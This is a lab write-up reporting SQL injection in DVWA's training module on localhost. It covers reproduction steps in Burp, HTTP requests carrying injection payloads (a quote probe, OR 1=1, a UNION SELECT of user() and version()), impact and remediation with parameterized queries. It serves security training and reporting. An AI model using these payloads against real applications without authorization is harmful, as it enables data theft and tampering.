# SQL Injection — DVWA SQLi module (classic string query)

## Summary

During authenticated testing of the **SQL Injection** vulnerability page (`vulnerabilities/sqli/`), the `id` parameter was concatenated into a backend SQL query without proper parameterization. At **Low** security, a single-quote probe produced a MySQL syntax error in the response body, confirming error-based SQLi. I escalated to UNION-based selection to retrieve database metadata (version, current user) as proof of impact.

## Severity

**High** (CVSS 3.1 approximate vector for authenticated SQLi with data exfiltration: `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L` → **8.3** — adjust if your scope treats “authenticated” differently).

## Steps to reproduce

1. Start the lab per `lab-setup/README.md` and log in as `admin` / `password`.
2. Set **DVWA Security** to **Low**.
3. Open **SQL Injection** from the sidebar.
4. Intercept the “Submit” request in Burp Proxy.
5. Send a benign request (`id=1`) to Repeater and note baseline response length and content.
6. Replace `id` with `1'` and observe MySQL error text in HTML.
7. Iterate in Repeater: close the string, add `OR 1=1--`, then build a UNION payload with matching column count (trial `UNION SELECT 1,2,3--` style until columns align with DVWA’s query shape for your version).

## Evidence

**Baseline (Burp Repeater)**

```http
GET /vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1
Host: localhost:4280
Cookie: PHPSESSID=...; security=low
```

Response (truncated): normal user profile output for ID `1`, HTTP 200, no SQL error strings.

**Error-based confirmation**

```http
GET /vulnerabilities/sqli/?id=1%27&Submit=Submit HTTP/1.1
Host: localhost:4280
Cookie: PHPSESSID=...; security=low
```

Response body contained a MySQL syntax error near the injected quote — different length and explicit DB error vs baseline (what my `scripts/sqli_scanner.py` is written to flag for triage).

**UNION proof-of-impact (example shape — column count varies by DVWA version)**

```http
GET /vulnerabilities/sqli/?id=1%27+UNION+SELECT+NULL%2Cuser%28%29%2Cversion%28%29--+-&Submit=Submit HTTP/1.1
```

I used Repeater to align NULL count with the original `SELECT`, then swapped the middle positions for `user()` / `database()` / `version()` until data appeared in the rendered “First name / Surname” fields.

## Impact

- **Confidentiality:** Read arbitrary data the application DB user can access (users, session data, application secrets stored in DB).
- **Integrity / availability:** With sufficient DB privileges, `UPDATE`/`DELETE` or file-write primitives (depending on DB config) can corrupt or destroy data — not demonstrated here but in scope for real apps.
- **Authentication bypass:** On **different** endpoints (e.g. login forms built with string concatenation), SQLi can become unauthenticated; DVWA’s login page is a separate test — this finding is scoped to the SQLi training module.

## Remediation

- Use **parameterized queries / prepared statements** for all SQL, with bound types for every dynamic value.
- Apply **least-privilege** DB accounts (no `FILE`, no `SHUTDOWN`, minimal schema grants).
- Add **defense in depth**: WAF/RASP only as a safety net, not a substitute for correct query construction.

See `docs/secure_coding_mitigations.md` for concrete PHP/Python examples.
